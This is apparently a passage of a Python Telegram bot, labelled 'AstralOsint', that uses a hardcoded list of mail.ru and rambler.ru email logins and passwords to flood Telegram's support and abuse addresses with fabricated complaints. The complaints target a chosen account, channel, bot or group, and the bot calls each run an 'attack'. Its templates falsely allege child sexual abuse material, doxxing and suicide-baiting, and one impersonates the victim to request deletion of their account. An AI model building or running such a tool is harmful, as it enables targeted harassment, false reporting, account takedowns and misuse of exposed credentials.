    'pupov.vanya01@mail.ru': '7mZ6vKAsiKhizbQr941N',
    'matvey.moroz2005@mail.ru': 'BbeyibLyma0ipFec4wpm',
    'vasya.burnov@mail.ru': 'MRWwb41PNBx49xbwCEgs',
    'annakrasnova.1994@mail.ru': 'jUFMXba6wLFcuQBkqht2',
    'olga.vladimirovna2211@mail.ru': 'XWSuBgDASvWtSTn6agrJ',
    'gerasim.dvorin.92@mail.ru': 'NG29UxH06pQB7B3tJQp2',
    'petrov.alexandr21@mail.ru': '5Qai4gtbDB96YX2zU9zs',
    'vladik.bobrov111@mail.ru': 'aUEFsvRbY8zCeXczuPYs',
    'tioreibunthandvahear@mail.ru': 'ggKygTjxSLzwm4tWd43B',
    'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
    'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
    'djsdksvzhj@rambler.ru': '7523251yAKPjZ',
    'twicbfjgoz@rambler.ru': '0187832xjeOz1',
}

# ---------------------- ПОЛУЧАТЕЛИ (почты поддержки Telegram) ----------------------
receivers = [
    'sms@telegram.org',
    'dmca@telegram.org',
    'abuse@telegram.org',
    'sticker@telegram.org',
    'support@telegram.org',
    'stopCA@telegram.org'
]

# ---------------------- НАСТРОЙКА ЛОГИРОВАНИЯ ----------------------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ---------------------- ИНИЦИАЛИЗАЦИЯ БОТА ----------------------
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

# ---------------------- ДЕКОРАТОР ДЛЯ ОГРАНИЧЕНИЯ ДОСТУПА ----------------------
def restricted(func):
    def wrapper(message):
        if message.from_user.id != ADMIN_ID:
            bot.reply_to(message, "🚫 Доступ запрещён. Ты не Альфа.")
            return
        return func(message)
    return wrapper

# ---------------------- ФУНКЦИЯ ОТПРАВКИ ОДНОГО EMAIL ----------------------
def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        if 'gmail.com' in sender_email:
            smtp_server = 'smtp.gmail.com'
            smtp_port = 587
        elif 'rambler.ru' in sender_email:
            smtp_server = 'smtp.rambler.ru'
            smtp_port = 587
        elif 'mail.ru' in sender_email:
            smtp_server = 'smtp.mail.ru'
            smtp_port = 587
        elif 'yandex.ru' in sender_email:
            smtp_server = 'smtp.yandex.ru'
            smtp_port = 587
        else:
            smtp_server = 'smtp.gmail.com'
            smtp_port = 587

        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        logger.error(f"Ошибка при отправке с {sender_email} на {receiver}: {e}")
        return False

# ---------------------- ОСНОВНАЯ ФУНКЦИЯ АТАКИ ----------------------
def launch_attack(chat_id, target_data, complaint_type, progress_callback=None):
    if complaint_type == 'account':
        sub_type = target_data.get('sub_type', 'spam')
        username = target_data.get('username', '')
        user_id = target_data.get('user_id', '')
        chat_link = target_data.get('chat_link', '')
        violation_link = target_data.get('violation_link', '')

        if sub_type == 'spam':
            subject = "Жалоба на спам в Telegram"
            body = f"Здравствуйте, уважаемая поддержка. На вашей платформе я нашел пользователя который отправляет много ненужных сообщений - СПАМ. Его юзернейм - {username}, его айди - {user_id}, ссылка на чат - {chat_link}, ссылка на нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю."
        elif sub_type == 'dox':
            subject = "Жалоба на распространение личных данных"
            body = f"Здравствуйте, уважаемая поддержка, на вашей платформе я нашел пользователя, который распространяет чужие данные без их согласия. его юзернейм - {username}, его айди - {user_id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его аккаунта."
        elif sub_type == 'insult':
            subject = "Жалоба на оскорбления и нецензурную лексику"
            body = f"Здравствуйте, уважаемая поддержка телеграм. Я нашел пользователя который открыто выражается нецензурной лексикой и спамит в чатах. его юзернейм - {username}, его айди - {user_id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его аккаунта."
        elif sub_type == 'session':
            subject = "Утерян доступ к аккаунту Telegram"
            body = f"Здравствуйте, уважаемая поддержка. Я случайно перешел по фишинговой ссылке и утерял доступ к своему аккаунту. Его юзернейм - {username}, его айди - {user_id}. Пожалуйста удалите аккаунт или обнулите сессии."
        elif sub_type == 'virtual':
            subject = "Жалоба на использование виртуального номера"
            body = f"Добрый день поддержка Telegram! Аккаунт {username}, {user_id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться. Прошу разберитесь с этим. Заранее спасибо!"
        elif sub_type == 'premium':
            subject = "Жалоба на спам с премиум-аккаунта"
            body = f"Добрый день поддержка Telegram! Аккаунт {username} {user_id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram. Прошу проверить данную жалобу и принять меры!"
        else:
            subject = "Жалоба на аккаунт Telegram"
            body = f"Пользователь {username} (ID: {user_id}) нарушает правила Telegram. Примите меры."

    elif complaint_type == 'channel':
        sub_type = target_data.get('sub_type', 'personal_data')
        channel_link = target_data.get('channel_link', '')
        channel_violation = target_data.get('channel_violation', '')
        subject = "Жалоба на Telegram-канал"
        if sub_type == 'personal_data':
            body = f"Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел канал, который распространяет личные данные невинных людей. Ссылка на канал - {channel_link}, ссылки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал."
        elif sub_type == 'animal_cruelty':
            body = f"Здравствуйте, уважаемая поддержка телеграма. На вашей платформе я нашел канал который распространяет жестокое обращение с животными. Ссылка на канал - {channel_link}, ссылки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал."
        elif sub_type == 'cp':
            body = f"Здравствуйте, уважаемая поддержка телеграма. На вашей платформе я нашел канал который распространяет порнографию с участием несовершеннолетних. Ссылка на канал - {channel_link}, ссылки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал."
        elif sub_type == 'price':
            body = f"Здравствуйте,уважаемый модератор телеграмм,хочу пожаловаться вам на канал,который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал:{channel_link} Ссылка на нарушение:{channel_violation} Просьба заблокировать данный канал."
        else:
            body = f"Жалоба на канал {channel_link}. Нарушение: {channel_violation}"

    elif complaint_type == 'bot':
        sub_type = target_data.get('sub_type', 'glaz_boga')
        bot_user = target_data.get('bot_user', '')
        subject = "Жалоба на Telegram-бота"
        if sub_type == 'glaz_boga':
            body = f"Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел бота, который осуществляет поиск по личным данным ваших пользователей. Ссылка на бота - {bot_user}. Пожалуйста разберитесь и заблокируйте данного бота."
        elif sub_type == 'suicide':
            body = f"Здравствуйте, уважаемая поддержка телеграмма. На вашей платформе я нашел бота который путем заданий приводит людей к суициду. Ссылка на бота {bot_user}. Пожалуйста разберитесь и заблокируйте данного бота."
        elif sub_type == 'cp_bot':
            body = f"Здравствуйте, уважаемая поддержка телеграмма. На вашей платформе я нашел бота который продает порнографические материалы с участием несовершеннолетних. Ссылка на бота {bot_user}. Пожалуйста разберитесь и заблокируйте данного бота."
        else:
            body = f"Жалоба на бота {bot_user} за нарушение правил."

    elif complaint_type == 'chat':
        sub_type = target_data.get('sub_type', 'simple')
        chat_link = target_data.get('chat_link', '')
        chat_id = target_data.get('chat_id', '')
        violation_link = target_data.get('violation_link', '')
        subject = "Жалоба на группу/чат Telegram"
        if sub_type == 'simple':
            body = f"Здравствуйте, уважаемая поддержка телеграмма. На вашей платформе я нашел группу с подозрительной активностью. Ссылка на группу - {chat_link}, Айди группы - {chat_id}. Пожалуйста примите меры в сторону данной группы и заблокируйте ее."
        elif sub_type == 'spam_chat':
            body = f"Здравствуйте, уважаемая поддержка телеграмма. На вашей платформе я нашел группу в которой проходят спам-рассылки. Ссылка на группу - {chat_link}, Айди группы - {chat_id}. Пожалуйста примите меры в сторону этой группы и заблокируйте ее."
        elif sub_type == 'insult_chat':
            body = f"Здравствуйте, уважаемая поддержка телеграмма. Я нашел группу с которой оскорбляют людей и используют ненормативную лексику в их сторону. Ссылка на группу - {chat_link}, Айди группы - {chat_id}, Ссылка на нарушение - {violation_link}. Пожалуйста примите меры в сторону этой группы и заблокируйте ее."
        else:
            body = f"Жалоба на группу {chat_link} (ID: {chat_id})"

    total = len(senders) * len(receivers)
    sent = 0
    failed = 0
    current = 0

    for sender_email, sender_password in senders.items():
        for receiver in receivers:
            ok = send_email(receiver, sender_email, sender_password, subject, body)
            if ok:
                sent += 1
            else:
                failed += 1
            current += 1
            if progress_callback:
                progress_callback(current, total)
            time.sleep(DELAY_BETWEEN_EMAILS)
        time.sleep(DELAY_BETWEEN_SENDERS)

    bot.send_message(chat_id,
        f"✅ Атака завершена!\n"
        f"📨 Отправлено успешно: {sent}\n"
        f"❌ Ошибок: {failed}\n"
        f"📧 Всего писем: {total}"
    )

# ---------------------- КОМАНДЫ И КНОПКИ ----------------------
def main_menu_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    btn_account = InlineKeyboardButton("👤 Аккаунт", callback_data="menu_account")
    btn_channel = InlineKeyboardButton("📢 Канал", callback_data="menu_channel")
    btn_bot = InlineKeyboardButton("🤖 Бот", callback_data="menu_bot")
    btn_chat = InlineKeyboardButton("💬 Чат/Группа", callback_data="menu_chat")
    btn_status = InlineKeyboardButton("📊 Статус", callback_data="status")
    btn_help = InlineKeyboardButton("❓ Помощь", callback_data="help")
    keyboard.add(btn_account, btn_channel, btn_bot, btn_chat, btn_status, btn_help)
    return keyboard

@bot.message_handler(commands=['start'])
@restricted
def start_cmd(message):
    bot.send_message(message.chat.id,
        "🔥 Добро пожаловать в AstralOsint, командир!\n"
        "Выбери цель для атаки:",
        reply_markup=main_menu_keyboard()
    )

@bot.message_handler(commands=['help'])
@restricted
def help_cmd(message):
    bot.send_message(message.chat.id,
        "📖 *Справка AstralOsint*\n"
        "Бот отправляет массовые жалобы в поддержку Telegram.\n\n"
        "Используй кнопки меню для выбора цели.\n"
        "После ввода данных атака запустится в фоне.\n"
        "Прогресс будет показываться каждые 10 писем.\n\n"
        "Команды: /start, /help, /status",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['status'])
@restricted
def status_cmd(message):
    stats = (f"📧 Отправителей: {len(senders)}\n"
             f"📬 Получателей: {len(receivers)}\n"
             f"⏱️ Задержка между письмами: {DELAY_BETWEEN_EMAILS}с\n"
             f"🔄 Смена отправителя: {DELAY_BETWEEN_SENDERS}с\n"
             f"💥 Всего писем за одну атаку: {len(senders)*len(receivers)}")
    bot.send_message(message.chat.id, stats)

@bot.callback_query_handler(func=lambda call: True)
@restricted
def callback_handler(call):
    chat_id = call.message.chat.id
    data = call.data

    if data == "menu_account":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("📛 Спам", callback_data="acc_spam"),
            InlineKeyboardButton("🕵️ Доксинг", callback_data="acc_dox"),
            InlineKeyboardButton("🤬 Оскорбления", callback_data="acc_insult"),
            InlineKeyboardButton("🔐 Сброс сессий", callback_data="acc_session"),
            InlineKeyboardButton("📱 Вирт. номер", callback_data="acc_virtual"),
            InlineKeyboardButton("⭐ Премиум-спам", callback_data="acc_premium"),
            InlineKeyboardButton("◀️ Назад", callback_data="back_main")
        )
        bot.edit_message_text("Выбери тип жалобы на аккаунт:", chat_id, call.message.message_id, reply_markup=markup)

    elif data == "menu_channel":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("👥 Личные данные", callback_data="ch_personal"),
            InlineKeyboardButton("🐾 Живодёрство", callback_data="ch_animal"),
            InlineKeyboardButton("🔞 ЦП", callback_data="ch_cp"),
            InlineKeyboardButton("💰 Прайс-канал", callback_data="ch_price"),
            InlineKeyboardButton("◀️ Назад", callback_data="back_main")
        )
        bot.edit_message_text("Выбери тип жалобы на канал:", chat_id, call.message.message_id, reply_markup=markup)

    elif data == "menu_bot":
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton("👁️ Глаз Бога (поиск по данным)", callback_data="bot_glaz"),
            InlineKeyboardButton("◀️ Назад", callback_data="back_main")
        )
        bot.edit_message_text("Выбери тип жалобы на бота:", chat_id, call.message.message_id, reply_markup=markup)

    elif data == "menu_chat":
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton("🚫 Обычный снос", callback_data="chat_simple"),
            InlineKeyboardButton("📨 Спам-рассылки", callback_data="chat_spam"),
            InlineKeyboardButton("🤬 Оскорбления", callback_data="chat_insult"),
            InlineKeyboardButton("◀️ Назад", callback_data="back_main")
        )
        bot.edit_message_text("Выбери тип жалобы на чат/группу:", chat_id, call.message.message_id, reply_markup=markup)

    elif data == "status":
        status_cmd(call.message)
        bot.answer_callback_query(call.id)

    elif data == "help":
        help_cmd(call.message)
        bot.answer_callback_query(call.id)

    elif data == "back_main":
        bot.edit_message_text("🔥 Главное меню:", chat_id, call.message.message_id, reply_markup=main_menu_keyboard())

    elif data.startswith("acc_"):
        sub_type = data[4:]
        msg = bot.send_message(chat_id, "Введи username (например @username или просто username) и ID пользователя через пробел:\nПример: @ivanov 123456789")
        bot.register_next_step_handler(msg, process_account_data, sub_type, chat_id)

    elif data.startswith("ch_"):
        sub_type = data[3:]
        msg = bot.send_message(chat_id, "Введи ссылку на канал и ссылку на нарушение (через пробел):\nПример: https://t.me/channel https://t.me/channel/123")
        bot.register_next_step_handler(msg, process_channel_data, sub_type, chat_id)

    elif data.startswith("bot_"):
        sub_type = data[4:]
        msg = bot.send_message(chat_id, "Введи username бота (например @botname):")
        bot.register_next_step_handler(msg, process_bot_data, sub_type, chat_id)

    elif data.startswith("chat_"):
        sub_type = data[5:]
        msg = bot.send_message(chat_id, "Введи ссылку на чат и ID чата (через пробел). Для insult ещё ссылку на нарушение:\nПример для обычного: https://t.me/chat -100123456789\nПример для insult: https://t.me/chat -100123456789 https://t.me/chat/456")
        bot.register_next_step_handler(msg, process_chat_data, sub_type, chat_id)

def process_account_data(message, sub_type, chat_id):
    parts = message.text.strip().split()
    if len(parts) < 2:
        bot.send_message(chat_id, "❌ Нужно указать username и ID. Попробуй заново.")
        return
    username = parts[0]
    user_id = parts[1]
    if sub_type in ['spam', 'dox', 'insult']:
        msg = bot.send_message(chat_id, "Введи ссылку на чат и ссылку на нарушение (через пробел):")
        bot.register_next_step_handler(msg, process_account_extra, sub_type, username, user_id, chat_id)
    else:
        target_data = {
            'sub_type': sub_type,
            'username': username,
            'user_id': user_id
        }
        start_attack_thread(chat_id, target_data, 'account')

def process_account_extra(message, sub_type, username, user_id, chat_id):
    parts = message.text.strip().split()
    if len(parts) < 2:
        bot.send_message(chat_id, "❌ Нужно указать ссылку на чат и ссылку на нарушение. Попробуй заново.")
        return
    chat_link = parts[0]
    violation_link = parts[1]
    target_data = {
        'sub_type': sub_type,
        'username': username,
        'user_id': user_id,
        'chat_link': chat_link,
        'violation_link': violation_link
    }
    start_attack_thread(chat_id, target_data, 'account')

def process_channel_data(message, sub_type, chat_id):
    parts = message.text.strip().split()
    if len(parts) < 2:
        bot.send_message(chat_id, "❌ Нужно указать ссылку на канал и ссылку на нарушение.")
        return
    channel_link = parts[0]
    channel_violation = parts[1]
    target_data = {
        'sub_type': sub_type,
        'channel_link': channel_link,
        'channel_violation': channel_violation
    }
    start_attack_thread(chat_id, target_data, 'channel')

def process_bot_data(message, sub_type, chat_id):
    bot_user = message.text.strip()
    if not bot_user:
        bot.send_message(chat_id, "❌ Введи username бота.")
        return
    target_data = {
        'sub_type': sub_type,
        'bot_user': bot_user
    }
    start_attack_thread(chat_id, target_data, 'bot')

def process_chat_data(message, sub_type, chat_id):
    parts = message.text.strip().split()
    if sub_type == 'insult':
        if len(parts) < 3:
            bot.send_message(chat_id, "❌ Для оскорблений нужно: ссылка_чата ID_чата ссылка_нарушение")
            return
        chat_link = parts[0]
        chat_id_val = parts[1]
        violation_link = parts[2]
        target_data = {
            'sub_type': sub_type,
            'chat_link': chat_link,
            'chat_id': chat_id_val,
            'violation_link': violation_link
        }
    else:
        if len(parts) < 2:
            bot.send_message(chat_id, "❌ Укажи ссылку на чат и ID чата.")
            return
        chat_link = parts[0]
        chat_id_val = parts[1]
        target_data = {
            'sub_type': sub_type,
            'chat_link': chat_link,
            'chat_id': chat_id_val
        }
    start_attack_thread(chat_id, target_data, 'chat')

def start_attack_thread(chat_id, target_data, complaint_type):
    bot.send_message(chat_id, f"⚡ Атака запущена. Это займёт ~{len(senders)*len(receivers)*DELAY_BETWEEN_EMAILS//60} минут. Я сообщу о завершении.")
    def progress(current, total):
        if current % 10 == 0:
            bot.send_message(chat_id, f"📊 Прогресс: {current}/{total} писем")
    thread = threading.Thread(target=launch_attack, args=(chat_id, target_data, complaint_type, progress))
    thread.daemon = True
    thread.start()

# ---------------------- ЗАПУСК БОТА ----------------------
if __name__ == "__main__":
    if not BOT_TOKEN or ADMIN_ID == 0:
        logger.error("❌ Задай BOT_TOKEN и ADMIN_ID в переменных окружения!")
        exit(1)
    logger.info(f"✅ Бот AstralOsint с прокси-поддержкой (для OSINT) запущен. Админ: {ADMIN_ID}")
    bot.infinity_polling()
